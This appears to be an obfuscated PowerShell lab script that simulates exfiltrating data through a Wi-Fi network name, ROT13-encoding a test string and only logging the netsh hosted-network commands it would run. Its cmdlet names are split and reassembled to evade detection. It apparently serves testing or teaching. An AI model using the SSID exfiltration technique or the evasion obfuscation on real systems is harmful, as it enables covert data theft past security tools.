Function Invoke-SSIDExfil {
    [CmdletBinding()]
    Param(
        [switch]$ExfilOnly , 
        [switch]$Decode , 
        [String]$StringToExfiltrate , 
        [String]$StringToDecode 
    )

    Function ConvertTo-ROT13 {
        Param([String]$InputString )

        $builder = & ('N' + 'ew-' + 'Objec' + 't') System.Text.StringBuilder
        ForEach ($char In $InputString.("{1}{2}{0}" -f 'ray' , 'ToCh' , 'arAr').invoke()) {
            $code = [int][Char]$char 
            Switch ($code ) {
                {
                    $_ -ge 65 -And $_ -le 90 }
                {
                    [Void]$builder."aPPeNd"([Char]((($_ - 65 + 13) % 26) + 65))
                    Continue 
                }
                {
                    $_ -ge 97 -And $_ -le 122 }
                {
                    [Void]$builder."APPenD"([Char]((($_ - 97 + 13) % 26) + 97))
                    Continue 
                }
                default {
                    [Void]$builder.("{1}{0}" -f 'ppend' , 'A').invoke($char )
                }
            }
        }

        Return $builder.("{0}{1}{2}" -f 'T' , 'oStrin' , 'g').invoke()
    }

    $artifactDir = .('Jo' + 'in-P' + 'ath') $PSScriptRoot "artifacts\ssid-exfil"
    If ( -Not (.('Tes' + 't-Pa' + 'th') $artifactDir )) {
        $Null = .('New-' + 'Ite' + 'm') -ItemType Directory -Path $artifactDir -Force
    }

    If ($Decode ) {
        $decoded = .('Con' + 'v' + 'e' + 'rtTo-ROT13') -inputstring $StringToDecode 
        & ('Writ' + 'e-Out' + 'p' + 'ut') "[safe] Decoded value: $decoded"
        Return 
    }

    If ($ExfilOnly ) {
        $plainText = $StringToExfiltrate 
    }
    Else {
        $plainText = "LAB:alice:hello"
    }

    If ([String]::("{4}{0}{2}{3}{1}" -f 'Nul' , 'iteSpace' , 'lO' , 'rWh' , 'Is').invoke($plainText )) {
        Throw "StringToExfiltrate cannot be empty."
    }

    If ($plainText."lEnGTH" -gt 32) {
        Throw "The simulated SSID payload must be 32 characters or fewer."
    }

    $ssidName = .('C' + 'onvertTo-' + 'R' + 'OT13') -inputstring $plainText 
    $logPath = & ('Join' + '-Pat' + 'h') $artifactDir "ssid-actions.txt"
    $commands = @(
        "[safe] Would run: netsh wlan set hostednetwork mode=allow ssid=""$ssidName"" key='HardtoGuess!@#123'" , 
        "[safe] Would run: netsh wlan start hostednetwork" , 
        "[safe] Plaintext source: $plainText" , 
        "[safe] ROT13 SSID: $ssidName"
    )

    & ('Set-' + 'C' + 'on' + 'tent') -Path $logPath -Value $commands -Encoding UTF8

    & ('W' + 'ri' + 'te-Output') "[safe] Simulated SSID exfiltration value: $ssidName"
    .('Wr' + 'ite-O' + 'utpu' + 't') "[safe] Actions logged to $logPath"
}

.('Inv' + 'oke-SS' + 'ID' + 'Ex' + 'fil') -exfilonly -stringtoexfiltrate "LAB:alice:hello"
